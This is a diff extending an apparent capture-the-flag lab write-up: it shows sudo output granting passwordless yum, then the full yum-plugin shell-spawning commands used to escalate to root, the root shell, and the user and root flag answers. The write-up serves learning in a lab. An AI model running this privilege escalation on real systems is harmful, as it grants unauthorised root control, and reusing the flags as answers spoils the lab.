@@ -128,7 +128,56 @@ Last login: Tue Mar  5 04:27:31 2024
 27a260fe3cba712cfdedb1c86d80442e
 ```
 20. Question `What is the user flag?` Answer `27a260fe3cba712cfdedb1c86d80442e`
-21. 
+21. Using `sudo -l` command shows `/usr/bin/yum`.
+```bash
+sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+22. Lets follow https://gtfobins.github.io/gtfobins/yum/ sudo exploit to get root.
+23. Just copy pasting given commands in `b` will upgrade ssh to `root`
+```bash
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+24. So typing `cat /root/root.txt` will give us root flag.
+```bash
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.2# cat /root/root.txt
+eec3d53292b1821868266858d7fa6f79
+```
+25. Question `What is the root flag?` Answer `eec3d53292b1821868266858d7fa6f79`
 
 ## Credits
 
